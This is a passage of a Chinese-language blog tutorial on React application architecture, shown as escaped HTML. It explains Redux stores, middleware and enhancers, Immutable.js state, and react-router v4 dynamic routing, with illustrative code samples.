(HTML结构和样式)\u003c/td\u003e\n\u003ctd\u003e业务逻辑（获取数据，更新状态）\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e感知Redux\u003c/td\u003e\n\u003ctd\u003e无\u003c/td\u003e\n\u003ctd\u003e有\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e数据来源\u003c/td\u003e\n\u003ctd\u003eprops\u003c/td\u003e\n\u003ctd\u003e订阅Redux store\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e变更数据\u003c/td\u003e\n\u003ctd\u003e调用props传递的回调函数\u003c/td\u003e\n\u003ctd\u003eDispatch Redux actions\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e可重用\u003c/td\u003e\n\u003ctd\u003e独立性强\u003c/td\u003e\n\u003ctd\u003e业务耦合度高\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 class=\"heading\"\u003eRedux\u003c/h2\u003e\n\u003cp\u003e现在的任何大型web应用如果少了状态管理容器，那这个应用就缺少了时代特征，可选的库诸如mobx，redux等，实际上大同小异，各取所需，以redux为例，redux是最常用的React应用状态容器库，对于React Native应用也适用。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eRedux是一个JavaScript应用的可预测状态管理容器，它不依赖于具体框架或类库，所以它在多平台的应用开发中有着一致的开发方式和效率，另外它还能帮我们轻松的实现时间旅行，即action的回放。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"redux-flow\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a51e7221214e9?w=967\u0026amp;h=587\u0026amp;f=png\u0026amp;s=27493\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e数据单一来源原则：使用Redux作为应用状态管理容器，统一管理应用的状态树，它推从数据单一可信来源原则，所有数据都来自redux store，所有的数据更新也都由redux处理；\u003c/li\u003e\n\u003cli\u003eredux store状态树：redux集中管理应用状态，组织管理形式就好比DOM树和React组件树一样，以树的形式组织，简单高效；\u003c/li\u003e\n\u003cli\u003eredux和store：redux是一种Flux的实现方案，所以创建了store一词，它类似于商店，集中管理应用状态，支持将每一个发布的action分发至所有reducer；\u003c/li\u003e\n\u003cli\u003eaction：以对象数据格式存在，通常至少有type和payload属性，它是对redux中定义的任务的描述；\u003c/li\u003e\n\u003cli\u003ereducer：通常是以函数形式存在，接收state（应用局部状态）和action对象两个参数，根据action.type(action类型)执行不同的任务，遵循函数式编程思想；\u003c/li\u003e\n\u003cli\u003edispatch：store提供的分发action的功能方法，传递一个action对象参数；\u003c/li\u003e\n\u003cli\u003ecreateStore：创建store的方法，接收reducer，初始应用状态，redux中间件和增强器，初始化store，开始监听action；\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e中间件（Redux Middleware）\u003c/h3\u003e\n\u003cp\u003eRedux中间件，和Node中间件一样，它可以在action分发至任务处理reducer之前做一些额外工作，dispatch发布的action将依次传递给所有中间件，最终到达reducer，所以我们使用中间件可以拓展诸如记录日志，添加监控，切换路由等功能，所以中间件本质上只是拓展了\u003ccode\u003estore.dispatch\u003c/code\u003e方法。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"redux-middleware-enhancer\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a51e72227141c?w=782\u0026amp;h=341\u0026amp;f=png\u0026amp;s=7057\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e增强器（Store Enhancer）\u003c/h3\u003e\n\u003cp\u003e有些时候我们可能并不满足于拓展\u003ccode\u003edispatch\u003c/code\u003e方法，还希望能增强store，redux提供以增强器形式增强store的各个方面，甚至可以完全定制一个store对象上的所有接口，而不仅仅是\u003ccode\u003estore.dispatch\u003c/code\u003e方法。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e logEnhancer = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ecreateStore\u003c/span\u003e) =\u0026gt;\u003c/span\u003e (reducer, preloadedState, enhancer) =\u0026gt; {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e store = createStore(reducer, preloadedState, enhancer)\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e originalDispatch = store.dispatch\n  store.dispatch = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eaction\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(action)\n    originalDispatch(action)\n  }\n  \n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e store\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最简单的例子代码如上，新函数接收redux的createStore方法和创建store需要的参数，然后在函数内部保存store对象上某方法的引用，重新实现该方法，在里面处理完增强逻辑后调用原始方法，保证原始功能正常执行，这样就增强了store的dispatch方法。\u003c/p\u003e\n\u003cp\u003e可以看到，增强器完全能实现中间件的功能，其实，中间件就是以增强器方式实现的，它提供的\u003ccode\u003ecompose\u003c/code\u003e方法就可以组合将我们传入的增强器拓展到store，而如果我们传入中间件，则需要先调用\u003ccode\u003eapplyMiddleware\u003c/code\u003e方法包装，内部以增强器形式将中间件功能拓展到\u003ccode\u003estore.dispatch\u003c/code\u003e方法\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ereact-redux\u003c/h3\u003e\n\u003cp\u003eRedux是一个独立的JavaScript应用状态管理容器库，它可以与React、Angular、Ember、jQuery甚至原生JavaScript应用配合使用，所以开发React应用时，需要将Redux和React应用连接起来，才能统一使用Redux管理应用状态，使用官方提供的\u003ca target=\"_blank\" href=\"https://github.com/reactjs/react-redux\"\u003ereact-redux\u003c/a\u003e库。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eclass\u0026nbsp;App\u0026nbsp;extends\u0026nbsp;Component\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;render\u0026nbsp;()\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;const\u0026nbsp;{\u0026nbsp;store\u0026nbsp;}\u0026nbsp;=\u0026nbsp;this.props\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;(\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Provider\u0026nbsp;store={store}\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;div\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Routes\u0026nbsp;/\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/div\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/Provider\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;)\u003cbr\u003e\u0026nbsp;\u0026nbsp;}\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003ereact-redux库提供\u003ccode\u003eProvider\u003c/code\u003e组件通过context方式向应用注入store，然后可以使用\u003ccode\u003econnect\u003c/code\u003e高阶方法，获取并监听store，然后根据store state和组件自身props计算得到新props，注入该组件，并且可以通过监听store，比较计算出的新props判断是否需要更新组件。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e更多关于react-redux的内容可以阅读之前的文章：\u003ca target=\"_blank\" href=\"http://blog.codingplayboy.com/2017/09/25/react-redux/\"\u003eReact-Redux分析\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ecreateStore\u003c/h3\u003e\n\u003cp\u003e使用redux提供的\u003ccode\u003ecreateStore\u003c/code\u003e方法创建redux store，但是在实际项目中我们常常需要拓展redux添加某些自定义功能或服务，如添加redux中间件，添加异步任务管理saga，增强redux等：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003e//\u0026nbsp;creates\u0026nbsp;the\u0026nbsp;store\u003cbr\u003eexport\u0026nbsp;default\u0026nbsp;(rootReducer,\u0026nbsp;rootSaga,\u0026nbsp;initialState)\u0026nbsp;=\u0026gt;\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;/*\u0026nbsp;-------------\u0026nbsp;Redux\u0026nbsp;Configuration\u0026nbsp;-------------\u0026nbsp;*/\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;Middlewares\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;Build\u0026nbsp;the\u0026nbsp;middleware\u0026nbsp;for\u0026nbsp;intercepting\u0026nbsp;and\u0026nbsp;dispatching\u0026nbsp;navigation\u0026nbsp;actions\u003cbr\u003e\u0026nbsp;\u0026nbsp;const\u0026nbsp;blogRouteMiddleware\u0026nbsp;=\u0026nbsp;routerMiddleware(history)\u003cbr\u003e\u0026nbsp;\u0026nbsp;const\u0026nbsp;sagaMiddleware\u0026nbsp;=\u0026nbsp;createSagaMiddleware()\u003cbr\u003e\u0026nbsp;\u0026nbsp;const\u0026nbsp;middleware\u0026nbsp;=\u0026nbsp;[blogRouteMiddleware,\u0026nbsp;sagaMiddleware]\u003cbr\u003e\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;enhancers\u003cbr\u003e\u0026nbsp;\u0026nbsp;const\u0026nbsp;enhancers\u0026nbsp;=\u0026nbsp;[]\u003cbr\u003e\u0026nbsp;\u0026nbsp;let\u0026nbsp;composeEnhancers\u0026nbsp;=\u0026nbsp;compose\u003cbr\u003e\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;create\u0026nbsp;store\u003cbr\u003e\u0026nbsp;\u0026nbsp;const\u0026nbsp;store\u0026nbsp;=\u0026nbsp;createStore(\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;combineReducers({\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;router:\u0026nbsp;routerReducer,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;...reducers\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}),\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;initialState,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;composeEnhancers(\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;applyMiddleware(...middleware),\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;...enhancers\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;)\u003cbr\u003e\u0026nbsp;\u0026nbsp;)\u003cbr\u003e\u0026nbsp;\u0026nbsp;sagaMiddleware.run(saga)\u003cbr\u003e\u003cbr\u003e\u0026nbsp;\u0026nbsp;return\u0026nbsp;store;\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eredux与Immutable\u003c/h3\u003e\n\u003cp\u003eredux默认提供了\u003ccode\u003ecombineReducers\u003c/code\u003e方法整合reduers至redux，然而该默认方法期望接受原生JavaScript对象并且它把state作为原生对象处理，所以当我们使用\u003ccode\u003ecreateStore\u003c/code\u003e方法并且接受一个Immutable对象作应用初始状态时，\u003ccode\u003ereducer\u003c/code\u003e将会返回一个错误，源代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eif\u0026nbsp;\u0026nbsp;\u0026nbsp;(!isPlainObject(inputState))\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;return\u0026nbsp;\u0026nbsp;\u0026nbsp;(\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;`The\u0026nbsp;\u0026nbsp;\u0026nbsp;${argumentName}\u0026nbsp;has\u0026nbsp;unexpected\u0026nbsp;type\u0026nbsp;of\u0026nbsp;\"`\u0026nbsp;+\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;({}).toString.call(inputState).match(/\\s([a-z|A-Z]+)/)[1]\u0026nbsp;+\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\".Expected\u0026nbsp;argument\u0026nbsp;to\u0026nbsp;be\u0026nbsp;an\u0026nbsp;object\u0026nbsp;with\u0026nbsp;the\u0026nbsp;following\u0026nbsp;+\u0026nbsp;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;`keys:\"${reducerKeys.join('\",\u0026nbsp;\"')}\"`\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cbr\u003e\u0026nbsp;\u0026nbsp;)\u0026nbsp;\u0026nbsp;\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如上表明，原始类型reducer接受的state参数应该是一个原生JavaScript对象，我们需要对\u003ccode\u003ecombineReducers\u003c/code\u003e其进行增强，以使其能处理Immutable对象，\u003ccode\u003eredux-immutable\u003c/code\u003e 即提供创建一个可以和\u003ca target=\"_blank\" href=\"https://facebook.github.io/immutable-js/\"\u003eImmutable.js\u003c/a\u003e协作的Redux \u003ca target=\"_blank\" href=\"http://redux.js.org/docs/api/combineReducers.html\"\u003ecombineReducers\u003c/a\u003e。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;{\u0026nbsp;combineReducers\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'redux-immutable';\u003cbr\u003eimport\u0026nbsp;Immutable\u0026nbsp;from\u0026nbsp;'immutable';\u003cbr\u003eimport\u0026nbsp;configureStore\u0026nbsp;from\u0026nbsp;'./CreateStore';\u003cbr\u003e\u003cbr\u003e//\u0026nbsp;use\u0026nbsp;Immutable.Map\u0026nbsp;to\u0026nbsp;create\u0026nbsp;the\u0026nbsp;store\u0026nbsp;state\u0026nbsp;tree\u003cbr\u003econst\u0026nbsp;initialState\u0026nbsp;=\u0026nbsp;Immutable.Map();\u003cbr\u003e\u003cbr\u003eexport\u0026nbsp;default\u0026nbsp;()\u0026nbsp;=\u0026gt;\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;Assemble\u0026nbsp;The\u0026nbsp;Reducers\u003cbr\u003e\u0026nbsp;\u0026nbsp;const\u0026nbsp;rootReducer\u0026nbsp;=\u0026nbsp;combineReducers({\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;...RouterReducer,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;...AppReducer\u003cbr\u003e\u0026nbsp;\u0026nbsp;});\u003cbr\u003e\u003cbr\u003e\u0026nbsp;\u0026nbsp;return\u0026nbsp;configureStore(rootReducer,\u0026nbsp;rootSaga,\u0026nbsp;initialState);\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如上代码，可以看见我们传入的\u003ccode\u003einitialState\u003c/code\u003e是一个\u003ccode\u003eImmutable.Map\u003c/code\u003e类型数据，我们将redux整个state树丛根源开始Immutable化，另外传入了可以处理Immutable state的reducers和sagas。\u003c/p\u003e\n\u003cp\u003e另外每一个state树节点数据都是Immutable结构，如\u003ccode\u003eAppReducer\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003econst\u0026nbsp;initialState\u0026nbsp;=\u0026nbsp;Immutable.fromJS({\u003cbr\u003e\u0026nbsp;\u0026nbsp;ids:\u0026nbsp;[],\u003cbr\u003e\u0026nbsp;\u0026nbsp;posts:\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;list:\u0026nbsp;[],\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;total:\u0026nbsp;0,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;totalPages:\u0026nbsp;0\u003cbr\u003e\u0026nbsp;\u0026nbsp;}\u003cbr\u003e})\u003cbr\u003e\u003cbr\u003econst\u0026nbsp;AppReducer\u0026nbsp;=\u0026nbsp;(state\u0026nbsp;=\u0026nbsp;initialState,\u0026nbsp;action)\u0026nbsp;=\u0026gt;\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;case\u0026nbsp;'RECEIVE_POST_LIST':\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;const\u0026nbsp;newState\u0026nbsp;=\u0026nbsp;state.merge(action.payload)\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;newState\u0026nbsp;||\u0026nbsp;state\u003cbr\u003e\u0026nbsp;\u0026nbsp;default:\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;state\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里默认使用Immutable.fromJS()方法状态树节点对象转化为Immutable结构，并且更新state时使用Immutable方法\u003ccode\u003estate.merge()\u003c/code\u003e，保证状态统一可预测。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eReact路由\u003c/h2\u003e\n\u003cp\u003e在React web单页面应用中，页面级UI组件的展示和切换完全由路由控制，每一个路由都有对应的URL及路由信息，我们可以通过路由统一高效的管理我们的组件切换，保持UI与URL同步，保证应用的稳定性及友好体验。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ereact-router\u003c/h3\u003e\n\u003cp\u003eReact Router是完整的React 路由解决方案，也是开发React应用最常使用的路由管理库，只要用过它，绝对会喜欢上它的设计，它提供简单的API，以声明式方式实现强大的路由功能，诸如按需加载，动态路由等。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e声明式：语法简洁，清晰；\u003c/li\u003e\n\u003cli\u003e按需加载：延迟加载，根据使用需要判断是否需要加载；\u003c/li\u003e\n\u003cli\u003e动态路由：动态组合应用路由结构，更灵活，更符合组件化开发模式；\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e动态路由与静态路由\u003c/h3\u003e\n\u003cp\u003e使用react-router v4版本可以定义跨平台的应用动态路由结构，所谓的动态路由（Dynamic Routing）即在渲染过程中发生路由的切换，而不需要在创建应用前就配置好，这也正是其区别于静态路由（Static Routing）所在，动态路由提高更灵活的路由组织方式，而且更方便编码实现路由按需加载组件。\u003c/p\u003e\n\u003cp\u003e在react-router v2和v3版本中，开发React应用需要在开始渲染前就定义好完整的应用路由结构，所有的路由都需要同时初始化，才能在应用渲染后生效，会产生很多嵌套化路由，丧失了动态路由的灵活性和简洁的按需加载编码方式。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ereact-router v4.x\u003c/h3\u003e\n\u003cp\u003e在react-router 2.x和3.x版本中，定义一个应用路由结构通常如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;React\u0026nbsp;from\u0026nbsp;'react'\u003cbr\u003eimport\u0026nbsp;ReactDOM\u0026nbsp;from\u0026nbsp;'react-dom'\u003cbr\u003eimport\u0026nbsp;{\u0026nbsp;browserHistory,\u0026nbsp;Router,\u0026nbsp;Route,\u0026nbsp;IndexRoute\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'react-router'\u003cbr\u003e\u003cbr\u003eimport\u0026nbsp;App\u0026nbsp;from\u0026nbsp;'../components/App'\u003cbr\u003eimport\u0026nbsp;Home\u0026nbsp;from\u0026nbsp;'../components/Home'\u003cbr\u003eimport\u0026nbsp;About\u0026nbsp;from\u0026nbsp;'../components/About'\u003cbr\u003eimport\u0026nbsp;Features\u0026nbsp;from\u0026nbsp;'../components/Features'\u003cbr\u003e\u003cbr\u003eReactDOM.render(\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026lt;Router\u0026nbsp;history={browserHistory}\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Route\u0026nbsp;path='/'\u0026nbsp;component={App}\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;IndexRoute\u0026nbsp;component={Home}\u0026nbsp;/\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Route\u0026nbsp;path='about'\u0026nbsp;component={About}\u0026nbsp;/\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Route\u0026nbsp;path='features'\u0026nbsp;component={Features}\u0026nbsp;/\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/Route\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026lt;/Router\u0026gt;,\u003cbr\u003e\u0026nbsp;\u0026nbsp;document.getElementById('app')\u003cbr\u003e)\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e很简单，但是所有的路由结构都需要在渲染应用前，统一定义，层层嵌套；而且如果要实现异步按需加载还需要在这里对路由配置对象进行修改，使用\u003ccode\u003egetComponent\u003c/code\u003eAPI，并侵入改造该组件，配合webpack的异步打包加载API，实现按需加载：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e路由层层嵌套，必须在渲染应用前统一声明；\u003c/li\u003e\n\u003cli\u003eAPI不同，需要使用\u003ccode\u003egetComponent\u003c/code\u003e，增加路由配置对象的复杂性；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u0026lt;Route\u0026gt;\u003c/code\u003e只是一个声明路由的辅助标签，本身无意义；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e而使用react-router v4.x则如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003e//\u0026nbsp;react-dom\u0026nbsp;(what\u0026nbsp;we'll\u0026nbsp;use\u0026nbsp;here)\u003cbr\u003eimport\u0026nbsp;{\u0026nbsp;BrowserRouter\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'react-router-dom'\u003cbr\u003e\u003cbr\u003eReactDOM.render((\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026lt;BrowserRouter\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;App/\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026lt;/BrowserRouter\u0026gt;\u003cbr\u003e),\u0026nbsp;el)\u003cbr\u003e\u003cbr\u003econst\u0026nbsp;App\u0026nbsp;=\u0026nbsp;()\u0026nbsp;=\u0026gt;\u0026nbsp;(\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026lt;div\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;nav\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Link\u0026nbsp;to=\"/about\"\u0026gt;Dashboard\u0026lt;/Link\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/nav\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Home\u0026nbsp;/\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;div\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Route\u0026nbsp;path=\"/about\"\u0026nbsp;component={About}/\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;Route\u0026nbsp;path=\"/features\"\u0026nbsp;component={Features}/\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026lt;/div\u0026gt;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026lt;/div\u0026gt;\u003cbr\u003e)\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e相比之前版本，减少了配置化的痕迹，更凸显了组件化的组织方式，而且在渲染组件时才实现该部分路由，而如果期望按需加载该组件，则可以通过封装实现一个支持异步加载组件的高阶组件，将经过高阶组件处理后返回的组件传入\u003ccode\u003e\u0026lt;Route\u0026gt;\u003c/code\u003e即可，依然遵循组件化形式：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e灵活性：路由可以在渲染组件中声明，不需依赖于其他路由，不需要集中配置；\u003c/li\u003e\n\u003cli\u003e简洁：统一传入\u003ccode\u003ecomponent\u003c/code\u003e，保证路由声明的简洁性；\u003c/li\u003e\n\u003cli\u003e组件化：\u003ccode\u003e\u0026lt;Route\u0026gt;\u003c/code\u003e作为一个真实组件创建路由，可以渲染；\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 class=\"heading\"\u003e路由钩子方法\u003c/h4\u003e\n\u003cp\u003e另外需要注意的是，相对于之前版本提供\u003ccode\u003eonEnter\u003c/code\u003e, \u003ccode\u003eonUpdate\u003c/code\u003e, \u003ccode\u003eonLeave\u003c/code\u003e等钩子方法API在一定程度上提高了对路由的可控性，但是实质只是覆盖了渲染组件的生命周期方法，现在我们可以通过路由渲染组件的生命周期方法直接控制路由，如使用\u003ccode\u003ecomponentDidMount\u003c/code\u003e 或 \u003ccode\u003ecomponentWillMount\u003c/code\u003e 代替 \u003ccode\u003eonEnter\u003c/code\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e路由与Redux\u003c/h3\u003e\n\u003cp\u003e同时使用React-Router和Redux时，大多数情况是正常的，但是也可能出现路由变更组件未更新的情况，如：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e我们使用redux的\u003ccode\u003econnect\u003c/code\u003e方法将组件连接至redux：\u003ccode\u003econnect(Home)\u003c/code\u003e;\u003c/li\u003e\n\u003cli\u003e组件不是一个路由渲染组件，即不是使用\u003ccode\u003eRoute\u0026gt;\u003c/code\u003e组件形式：\u003ccode\u003e\u0026lt;Route component={Home} 